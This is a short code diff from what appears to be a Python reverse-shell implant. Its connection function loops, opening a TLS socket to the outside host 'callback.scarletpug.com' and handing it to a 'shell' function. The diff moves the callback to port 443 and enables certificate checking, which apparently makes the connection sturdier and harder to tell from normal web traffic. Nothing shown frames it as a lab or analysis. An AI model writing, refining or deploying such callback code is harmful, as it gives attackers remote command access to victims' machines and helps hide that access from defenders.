@@ -225,16 +225,16 @@ def shell(s):
 
 def connection():
     host = 'callback.scarletpug.com'
-    port = 5555
+    port = 443
 
     context = ssl.create_default_context()
-    context.check_hostname = False
-    context.verify_mode = ssl.CERT_NONE
+    context.check_hostname = True
+    context.verify_mode = ssl.CERT_REQUIRED
 
     while True:
         try:
             raw_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s = context.wrap_socket(raw_socket)
+            s = context.wrap_socket(raw_socket, server_hostname=host)
             s.connect((host, port))
             shell(s)
             s.close()
